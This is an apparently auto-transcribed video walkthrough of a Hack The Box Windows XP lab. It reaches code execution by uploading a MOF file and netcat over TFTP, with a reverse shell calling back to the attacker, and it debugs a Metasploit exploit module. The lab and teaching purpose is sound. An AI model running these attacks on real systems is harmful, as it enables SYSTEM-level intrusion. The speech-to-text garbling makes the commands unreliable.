 what's going on YouTube this is IPSec can be doing drop zone from hack the box which I really like this box because it benefits those that do analysis and earn tools to see how they work if you're the type of person that says you know what I used this PS exact thing a lot in Metasploit let me see how it actually gets the code execution this box may take you under 15 minutes because it's a Windows XP box with TFB running a system and the TFP root directory is C colon so there's no hurdles to get right access to a Windows XP box as system if the type of person that says you know what these tools are gonna do some magic I'm gonna get shells and I'm fine with that arrangement this can be tough because you won't know exactly how to get code execution on XP from just writing a file this it was I believe patched not working in more recent versions of Windows because well Stuxnet used this for both a privacy and lateral movement technique but we'll get into all that in this video and then also we'll probably get into debugging Metasploit modules and doing some cool things within Metasploit so let's just jump in as always we'll stall for the end map so and map - SC for default scripts sv enumerate versions Oh a I'll put all formats put in the EM app directory and call it drop zone then the IP address which is ten ten ten ninety can take some time to run so I've already run it looking at the results we see no ports are open however nmap detects the post is up so most likely it responded via an ICMP ping so if we just ping ten ten ten ninety we do see the buff response so we know it is online and maps default host discovery is ICMP port 80 and port 443 I think it's a TCP a con eighty and a TCP syn on 443 and for ICMP it's probably a echo request and timestamp request not really needed information just some information there but when we don't see any attack surface on TCP we're gonna switch over to UDP so we'll do a map - su for UDP - Oh a for output or formats we'll put it in an map call it drop zone - UDP and then ten ten ten ninety and the reason I don't use scripts on my initial UDP skin is because UDP scans are slow so scripts just make it take forever we do see one port is open that is TFTP on port 69 so I'm going to do TFTP 1010 1090 and we'll just try getting a file so we can do gets and puts with TFTP so we'll get please subscribe and see that the server responds it couldn't find the file C colon backslash please that subscribe which is super handy because it's telling us the TFTP root directory is C colon backslash because that's what it prepended so if we did a file we know exists like sequel windows it'll say the access to the past sequel and backslash windows is denied and it's saying that because TFTP can't download folders so whenever you specify a folder you get access to nine but the difference between these two error messages tells us we're operating out of C colon backslash so the next thing I wanted to do is find out what user I'm running as so I tried to leek the username by putting it in a Windows variable and hope how I hoped that it said could not find file sequin backslash and then the current user wasn't the case so I'm just going to try to download a file that is only accessible by local system so windows system32 config sam and we see the process cannot access this file because it's used by another process it doesn't say access denied so we know we're running as system if you didn't know what this file is I think this is the security and I forget what it is security accounts manager that's what sam stands for and it's worth I believe the boot key is stored and the boot key is what is used to encrypt the Sam database which is the local accounts and also I believe the NTDs bit which is the active directory file which has the hashes for the whole domain so you always want to grab this file it requires system and you have to be kind of above system because there's a NTFS lock on it so unless you do like a shadow copy to download it or go below NTFS you can't access a file while windows is running but we're gonna assume right now we're running as local system because we didn't get access to night the next file I'm going to try to get is backslash users because this is gonna tell me if it's Windows XP 7 or and we see it couldn't find that file so I'm gonna get slash documents and settings and we see it does three different requests all broken up by these spaces so I'll try get slash and put documents and settings and quotes and see what happens and it still does that so which I get and put the whole thing in quotes and it's still breaking up the requests into three different requests so this is a problem with this TFTP client if we use something like 80 FTP I would assume we could just put it in quotes but we don't have a TFTP we only have TFTP right now and because this isn't Windows 10 we have short file names I think in Windows 10 Microsoft did away with them and essentially it's the old like naming convention used indoors because fat32 had very short or fat 16 I think the file system used in the 90s you couldn't have long filenames so for long filenames what they did is they abbreviated them so doc you me and then this little squiggly thing that's left to the one would say hey this is the very first file that begins with there's first six characters so everything is always gonna be eight characters so try get doc you me then squiggly one and we see exits a path documented settings is denied so a suspicion is confirmed this is probably a Windows XP box because it uses documents and settings and not users so the final thing we kind of want to know is this 32-bit or is this 64-bit so we'll use the short path for program files so that's slash progra then squiggly one and we see access to past C colon program files is denied so the second one x86 would be slash progra squiggly 2 and we see it couldn't find that file so that folder doesn't exist which means this is going to be a 32-bit XP box so we know we're running as local system and we have write access to the box I'm kind of ignoring the whole can read any file from the box because the attack surface is only TFTP so even if we could read like a configuration that had a user password on it we have no way to really use it because it's not listening on any services where it would ask for a username and password so we just want to know how can we write a file to a Windows box and get code execution you could do a lot of googling around for like TFTP write file code execution Windows XP but if you just knew how like the tools you probably use work it would be really obvious so that's what we're going to look into we're gonna look into a Metasploit module I'm sure almost everyone has used and that is the PS exec so I'm doing locate PS exec dot or just do locate PS exact and search grep but Metasploit okay so we have quite a few things we want the music shared Metasploit modules exploits windows SMB PS exec and let's look at this so go to the very top the header initialize and the targets we have PowerShell native upload Moff upload so let's look at what each of those are chances are we can ignore PowerShell because it's Windows XP that doesn't really have PowerShell but while we're looking at it might as well learn exactly how it works so PowerShell is just running this function execute power shell payload so I'm going to search it for this script and we don't have the function defined here so I'm going to take that same locate px exact grep Metasploit and then Zoggs it for X args for grep and then execute underscore PowerShell I think it was and we can see the very first result this SMB client PS exec has def execute power shell so this is probably what we want looking into this script we can do execute power shell and here we're calling it out so the very first thing we're doing is another thing CMD psh underscore payload and coding it and this is the architecture so probably x86 or x64 and one super cool thing about Metasploit is you can always drop into interactive Ruby so let's do MSF console load up Metasploit and we're going to show this by generating this CMD psh payload by using kind of a debugger like feature so let's use was it windows exploit SMB yes exec don't get that right probably not it's taking a while so let's just search for PS exec and then use I swap them its exploit windows not windows exploit so options and we can see all the options but if we just type IRB for interactive Ruby we drop into a IOB shell so we wanted to run CMD underscore psh underscore payload so CMD psh underscore payload and the arguments and I believe there were two is the payload and then the architecture so we'll do the payload as please subscribe and the architecture will just do x86 so if we run this it automatically generates that Ruby for us so we're not Ruby PowerShell so let's copy all this I don't think we need that first quote and then go to a new window the payload or will make a directory psh analysis I think I'm I spelled that oh well and then edit payload and coded paste this in we can cut this and we see it does new object on this giant memory string which is a bunch of base64 and it's Cavs calls around gzip and compression so when we echo - n now saying the gzip compression see right there right here but we echo this base64 - D get a bunch of garbage however I think if we do file let's just put it to a file first so we'll do payload Z because it's going to be gzipped since we solved that in the code but if we do file against that we see it is gzip compressed data so we can just do Z cat and this is going to cat and undo GZ compression and then I can remember where I put the payload as payload Z so Z cat payload Z and we see the PowerShell payload now that Metasploit uses and there's also one more base64 which part and this is it executing code so if we echo - n base64 - D we have please subscribe so it generates all this code just to execute please subscribe in PowerShell essentially so we can exit IRB and go back to analyzing this so we know what this payload looks like and then it's going to do a PS exec so let's see exactly what PS exec is how did this works so we have definition PS exec and then command disconnect true so it's connecting to our host on IPC this is I think and I figure what IPC stands for in a procedural call I think internal procedural call something procedure call and then so it's connecting to that this is a share on Windows host and we're doing dce/rpc distributed computing environment remote proceed roll call and then connecting to SVC CTL so the service control so I believe if you did like MMC that Microsoft management console opened it up did local services and then specified you want to connect to a remote host that's what this functionality is so we're connecting to the service control of a remote host is access denied it's still connecting we're creating a service and then I'm guessing we're going to upload a file eventually let's see where is it disconnect so simple disconnect it's guys start of upload a file somehow oh no it's probably just executing the powershell it's embedding that within the service maybe not exactly sure how that works but you can go dig through that code if you want I'm guessing it just embeds the PowerShell and that's what this is doing command yep so command gets passed to PS exec and where's PS exec so if we search command go to the next instance SVC handle so it's embedding that PowerShell inside of SVC handle so that's what the powershell payload does is it creates a service and that embeds the powershell payload within the service it creates it doesn't create an actual file I believe so the next one we look at actually does create a file so let's go back let's see we wanted Metasploit let's just do locate PS exec dot RB should upload open these in multiple windows then rename this window would do module and let's create a new pane send this to four go back here and let's look at the other PS exec module the exact RB here this will be yes exact okay so the module we just looked at exactly what execute power shell payload does so the next thing it falls back to is native upload with workaround so let's see what is this we search for this we see the function is defined within the Metasploit module and we have if it's windows 5.1 i guess this is a Windows XP thing but we're doing a call to native upload data store share so we go into Metasploit see we can just exit this show options the SMB share is a defined thing and it's set to admin dollar sign by default which I believe is sequel and windows system32 so let's look at where the native upload function is and we don't see any definitions here so let's go to the PS exec source look at native upload and here we go so this is the other way it works other than PowerShell so file is equal to a random 8 character alpha string and then service encoder not sure exactly what that's doing it's uploading payload so it's grabbing SMB underscore share which is a variable name past if you look at the module that is gonna be the share from the Metasploit module so by default it's admin dollar sign so doing a bunch of things connecting to our host and then admin dollar sign and then opening a file writing a file and now right here I think it completely writes we generated the payload exe service with all the options created the file disconnect and then we're doing PS exact file location so this time instead of doing PS exec on the command the PowerShell thing we're doing PS on the file location so if the host doesn't have PowerShell it's going to connect via the service control create a new service tell that service to execute this file but all of this doesn't really help us because we don't have four or five open so we can't connect to the service control so the last option is MOF upload and i forget exactly what MOS stands but I think it's management object framework management object framework MOF see if this is it that's taking a while to load so we'll just go back so let's take a look at what moth upload does searching for it in this module we don't get anything so let's go to the PS exact source and at definition moth upload we have it doing the share is equal to datastore or host and then the admin dollar so it's ignoring the file share specified from Metasploit and we're saying if the share is not admin then we say it doesn't work so it really expects the share to be windows system32 and then the next thing we're doing is connecting generating a payload exe and then dropping a file in system 32 so this is just dropping meterpreter into system 32 or whatever we configure to be the payload then we're doing moth named generate moth and this is just like the generate psh underscore CMB that we did earlier so with muff name and file name it's uploading and it uploads to system 32 WM moth and then the name and disconnects and if we go back to the module it ends there so it literally just got code execution by dropping a file in that directory and that is one that I think got discovered by Stuxnet and if you don't aren't familiar with Stuxnet I'd highly recommend reading the book countdown to zero day the long story short is Stuxnet moved around networks by exploiting a print spooler driver to drop a file in the W bam moth directory which then auto execute sand gains code execution additionally if a computer had a printer shared out it was remote code execution so it worked as both a prim s --q and RCE so let's take a look at exactly what a moth is so we have generate underscore moth the name and file name so we'll go back to Ruby do IRB - interactive Ruby generate underscore moth would do please subscribe and we'll also say and retweet this video so that is ugly let's do puts which is like Ruby's print and see if that is any better there we go so let's copy this ma file and go over exactly what's going on here I'm probably gonna delete some things because it's going to be pretty long and confusing we don't need a lot of this so let's do make the off and then v-initial dot MLF so ASIS in and we have a pretty big file so the very first thing we want to do is look at where please subscribe the name so that is going to be W The Moth good and then the next thing we wanted was retweet which is the command we're running so we got JavaScript command here and retweet this video so essentially a moth works by compiling syntax like this into the WMI database and before Stuxnet I don't believe people really realize that you could just execute code like this because WMI just wasn't really explored now thinking about it it seems really simple and hindsight's 20/20 but essentially you create a filter to consumer binding to tie together a event filter and a script or not script a event consumer so that filter the consumer binding is saying hey when this event filter kicks off go execute this program and then event filter could just be hey watch this log file for when we create a new thing in the W my database so it just immediately immediately executes scared that way if you want some good readings I would highly recommend searching pop-pop rat moth and reading this blog post as well as searching blackhat WMI because ma fouls aren't really a thing that anymore because windows stopped auto compiling them by dropping them into a directory but it still abuses WMI which is the new hotness or one of the new harnesses so this blog post is pretty good has lots of diagrams showing you like the event filter and consumer being tied to filter consumer binding the black hat w my talk this is from 2015 so about three years ago has a bunch of information on event consumers so we have five different event consumers the log event consumer rights to a log file active script event consumer execute embedded VB or J script and this is what we're using because we saw JavaScript we have NT event log this creates a I think a Windows Event log SMTP to send emails and command my an event consumer which just pretty much does CMD dot exe /c I believe the active event consumer is pretty cool now especially with the release of dotnet to j/s because with NW mi you can just have this execute dotnet code because you can convert a dotnet class to JavaScript then embed it within W my command and it just is pretty hard to spot so if you want further reading go into all of that but let's kind of explain how this works so I'm gonna take all the twos out all the twos are doing is cleaning up and deleting stuff afterwards but they create a lot of noise in this which could make it hard to understand what's happening so this should work without the cleanup afterwards so let's see let's start off with this so we have the name space root CI m v2 this is just a [Music] pretty much a table within WMI i believe the name of the class the co uh a Yeoh ID for this event I don't think this actually matters we could change to be whatever we wanted to as long as it was the same like number of characters between each of these dashes so let's go down and the very first thing we want is the instance filter to consumer binding as bind so where is bind else in here there's no other binds so this is saying filter the consumer binding consumer is cons and filter is filled so let's search for cons and we see the consumer is this active script event consumer and it's just executing jscript and we don't want it to do retweet this video let's say we want to execute netcat - e CM d 10/10 1417 i think my IP yep 1010 1470 and let's do port 9001 so now would we change the command to netcat back to me and that's all that does so the next one is filter so let's search for filt and event filter as filt and this is just saying select star from instant creation event where target instance dot class is equal to my class two seven seven three six and that's what our class name is so upon creation of this class execute this code sounds really simple so let's see if this works so the first thing we're going to have to do is grab netcat because net cats not default on Windows so I'm just going to do a locate and see exe and we'll copy it from user share windows binaries so CP and I want to do a file against this to make sure it's 32-bit let me do TFTP 1010 1090 we want to change the mood to binary by default I think it's in ASCII mood since this isn't just a ski we want to send binary data so I'll do put NC exe and I'm gonna put it in windows system32 so I'm not too worried about padding if I put it in windows system32 it's just gonna execute if I don't specify C colon backslash backslash and C dot exe or whatever so could not put it there we have to put the whole file name so put NC exe and we can exit TFTP actually we'll still need to FTP we won't do NCLB NP 9001 and what was the file name we had created it was initial dot mom so we'll put initial dot moth into windows system32 W them Mothe and then we'll call this anything we want so please subscribe both and this is the auto execute directory so we saw this and the Metasploit modules it's also in the registry you can just google like mauve autoexec directory but we put this in and we get a call back immediately if we do Who am I we don't have that echo percent username don't have that either so we can't look at what user we are just because I don't know how on Windows XP but we can go to documents and settings administrator and if we go to desktop we got route text and then it's easy but not that easy so we didn't get the flag yet we go into the flags directory we have a file to for the price of one someone do type and then copy this put this in quotes so we can see it and we see for a limited time only keep an eye out on a ad s for new offers and discounts and that's in capitals so that's probably a hint and the Box coda connection but abs is alternate data streams so Windows XP doesn't have a method to view alternate data streams natively so that means we have to download a program so I'll do stream sysinternals I think that's the filename yep streams and this is something that will work on Windows XP to view alternate data streams and this was done on a few other boxes I want to say Jeeves and there was another one but drawing a blank on the name so copy download streams zip let's unzip this and let's move streams into moth the downside of TFTP is you can see every failed attempt still is creating a file so yeah we just get messy directory so let's go and I'm off TFTP ten ten ten ninety mode binary and then we want to put streams Exe windows system32 streams Exe and we're just putting that so we don't have to use the absolute path every time we want to call streams so if we exit this we can see mcl VMP 9001 and let's put a file again so we'll call this I always like using different names when I upload just so we uh I think we can use the name same name and see what happens so please subscribe dumb off and we get a show so name doesn't really matter that much so if we go to users not users um documents and settings administrator desktop Flags was it and I can do streams I'm just gonna do two star streams - except Yola because this is assists internal tools and we always have to do that streams recurse web directories delete stream we can just do to store and there we go we got both the root and the user text files so that is the Box what we're gonna do a little bit more in this and investigate the Metasploit modules get a working Metasploit module learn more about debugging Metasploit modules so the rest of this video will be all about Metasploit let's clean up all these panes I'm just doing the hotkey and then X to delete pane and this should be good so first thing one do is locate TFTP grep for Metasploit and see what exists probably grep exploits and then we get FTP as well so let's because like 32-bit FTP says TFTP so I changed my grip to be / TFTP / and we just get a list of TFTP exploits so long filename doesn't seem like it's going to really help us but distinct TFTP traversal that may so let's look at exactly what this is doing this exploit exploits of vulnerability indistinct TFTP server contains a directory traversal vulnerability that allows remote attacker to write a file to the filesystem which results into a system so I'm going to search this for moth and we see this exploit is using a ma file so let's see how does this work so definition of exploit grabbing our host Exe name off name levels uploads the which is executable that we want to run this is going to be meterpreter to sequel and windows system32 this is exactly what we did with netcat and you're just doing this to avoid having to worry about absolute paths and things like that then we're sleeping for a little bit and sending a moth file to WB moth so this should work if we just run this because it's doing exactly what we had done so let's do MSF console and I'm gonna copy this and once Metasploit opens up we can do use and then show options set our host to 10 10 10 90 set L host - ton 0 do this twice just so we make sure we listen on that and this should just magically work so we go to run and we get incorrect filename and pack it so if we do show options we have the depth set to 10 which that may be the issue because that's doing like dot dot slash so let's see what happens if we do a new thing TFTP ten ten ten ninety get / Windows access path is denied get dot dot slash dot dot slash Windows and crack filename so you have to be dead on with your past reversals so if we do set depth to zero and run this it's still doing the same exact thing so at this point you can analyze the code or decide you wanted to debug it and we're just going to go into the debugging route so I'm gonna exit Metasploit because we're running Metasploit within the user share and you should never really modify files within us are because this is where app thinks they are and if we do things without telling a package manager then bad things can happen so I'm gonna copy the Metasploit framework into /opt which is generally where I store files that I actually work work with and then compile etc so we'll go into opt Metasploit framework and then I'm going to do a gem install and we'll do PR why be ye bug pry by bug and this is a ruby debugger we can google this and you can see it's step-by-step debugging will also want to copy something here I want to copy this into my PI RC file because I don't want to type continue every time this is just remapping continue to see so let's do V PI what was the thing prior are see paste and then this sounds also good Anna will repeat the last command so we got that and then we got just tell Metasploit to use this module so I tried doing them the gem file and I've always had bad luck doing it this is the way I found that works the easiest just go into MSF console require pry - by bug and now we just have to copy that module to our local directory and then we can start working with it so let's run locate to find that module again we'll copy the Metasploit path and then do a make directory - P to create all parent directories and we'll do our home directory MSF for paste this in so now we have the TFTP folder structure and Metasploit forward directory and then we want to copy the script into that directory and we'll call this TFTP underscore Mothe dot RB so let's edit that file and we don't really care about all this metadata if we're actually creating a script and uploading it we would but this would just take a lot of time to modify the name and stuff all we care about is how the script is working and how we can get into a debugging session so just at the beginning of exploit type binding dot p or y and then exit it so now we'll run a modified MSF console and this is the MSF so that we have require pride - by bug in it and then once it loads we can just do use exploits exploit windows TFTP TFTP underscore moth show options and all we care about is setting our has to be ten ten ten ninety setting depth to be zero and setting l host to be ton zero so when we run this script we should get dropped to a debug session so here we are and we are on line 84 which is right after binding dot pry and then we can just hit n to go to next line and then if we wanted to see the variable of exe name we just type you AC name hit enter and we can see it is creating the exe z jpg VCC Exe so we can break let's see what is it getting a file so it's uploading this so let's break right after levels so break 94 continue with C and we're at line 94 so now we can do levels because a depth if we just type depth it's set to 10 and if we looked we had set depth to 0 so looking at this code we have Ruby's weird way of doing if thenns if depth is nothing which is nil or depth is equal to zero set depth to 10 and this is what is screwing us up so if we print levels even though we set depth to 0 it is putting all of that junk there so let us exit this create a new pain go into our directory edit TFTP moth and then go to depth and we'll just delete this if then to say depth is always equal to data stored depth okay and then reload to reload this module run it again and we want to remember to break at 94 we got a kill we do jobs wait the device is already in use and we don't have any active jobs set hope for it to be 9,000 - I don't know why 0.4444 is still listening oh well I guess I just exited the script weird and never cleaned that up but back into debugging we can set a breakpoint for what is it 94 continue it would take a few seconds to step through to get to this part and then now we can do depth depth is equal to 0 and that levels dot dot slash times depth if we do levels it is nothing so let's do our for run we'll get out of maybe just see to continue continue maybe it's spell out run next continue there we go and nothing really happened we didn't get a callback if we were super observant we see at the start of this exploit it is sending a hundred and forty five bucks and after about 30 blocks it starts uploading them off so if we go back and look at the script it's got a sleep command after that upload so maybe this upload isn't waiting for this to finish maybe it just starts the upload sleeps went indeterminate amount of time and then hopes it's done and begins uploading the second thing so let's just increase the sleep time but by a little bit and we'll reload a module and actually we can take out the pride bug we don't need to debug this anymore so we can remove that reload it again and I'm faithful this is gonna work someone may even exit that window and we'll just wait for this to finish reloading and run it again so run and are we going to get a call back we started a handle on what 9000 - it's now quitting all the payloads and that's weird I guess I did q s MH point didn't save it we'll just do next continue and we see it just DRAM we stopped at 27 blocks that is bizarre so reload let's edit this go having my history so CD MSF four modules exploits Windows TFTP them TFTP moth I took that out that is bizarre reload because part of me is wondering if having pry in there and load and going through the debugger interface if that's actually slowing the module down so run this again stir to the listener and it's generating the payloads now and hopefully this time it works why are we going into this just probably have a run finish is f we'll just do F and it's stopping at 26 bytes and we got a hundred and forty five blocks let's control C escape out of this exit and then run MSF console again maybe it had something weird in memory because this is behaving bizarre it sort of broke if we had commented out the binding go have anywhere else nope it's not in the script at all so let's use this our host depth and I'll host I'll port run now it shouldn't go into our debugger there we go and it stopped at 51 blocks again it should be going beyond that I thought uploaded and no session created so show options windows meterpreter reverse tcp let's just go into this set this for 10 increasing this delay upload exe name that looks good Ruby reload or run this again I have no clue why is stopping at block 52 let's look at the code one last time go here so that's where we set that timeout oh there's another select so it does see what is this functional min upload Oh so let's see yeah so this was set to one up here this is the upload function and what happened was the time out here is select one this is the time out and then when that finishes it says T FTP client stop so it's definitely back rounding the file upload and just hoping it finishes within this time and then stop in the transfer I set the time out after this upload but it didn't matter because the TFTP transfer already stopped so if we sent this to five let's see if we get beyond fifty two blocks so reload now this all makes sense helps if I read the whole source code but run this see set depth zero run there we go and it's going beyond that so we have uploaded 145 blocks which is what we expected upload and now we have meterpreter session one has been open we do sessions - i won uh we already did already in meterpreter so we can just do shell okay that was weird echo percent username percent and it says dropzone dollar sign this means we're local system the dollar is username generally means it's a system account so now we're got meterpreter on the box we can use meterpreter to look into WMI and kind of explore this so let's type help to see the meterpreter commands and we don't see anything with WMI so what i'm going to do is load and we have load - elder all the modules so we have a few more meterpreter modules we can load I'm going to load the extended API and now if we do help again we have a bunch more meterpreter commands and one of them is w my query so if we wanted to we could just Google W by win32 process this is just like a W my class thing explaining exactly how to use W my but we're just going to do an examination on our MA file so if we do CD off we can look at the initial moth and say select star from let's do 132 provider so go back into interpreter select star Doe my query select star from this and it aired it's great to put this in quotes or is my W my wrong I think my W my is wrong so let's go back here let's try a different one let's look at all the event filters so we can do dome my query select star from event filter and we can see the instance deletion event which isn't in our script but this is the one meterpreter did we had deleted this so upon instant deletion I think it's deleting this file let's see we go back in here we can try select star from filter to consumer binding see if this shows anything select done my query select star from this and we can see the filters currently to filter to consumer bindings and we got a sec and qnd a sec so this is the second one that meterpreter creates so this is all weird to you we could just ignore doing the W microwaves about what we created and just explore WMI in general so if we do to my query let's go here let's do win32 process so this is a class so if we select start from this class we gotta underscore it's a case sensitive that should I've done it do my query select stir from win32 process what did I have different there oh I didn't have a from but we see this is all almost impossible to read because it goes forever at length because it has each of these kind of tables so we can look at what we'd want to see so we can see executable path that sounds cool so if we do select executable path from win32 underscore process put these in quotes I forgot W by query we got a quote there we go we can see everything that is running on this system and this looks odd because this is our motor procession remember we have a bunch of random characters exe in system 32 well just looking at the processes shows us a particular session so we could also do some pretty cool things like let's see what else is in 132 132 share so if we do don't my query select stir from win32 share we can see all the shared drives on this machine IPC admin and see so you can go and explore WMI a bit more and learn that I'd highly recommend it it's really handy for just finding quick information about remote computers you can do things like query the antivirus to see what exclusions are applied just all sorts of things in the WMI database so I think that's going to end the video for now take care and I will see you all next week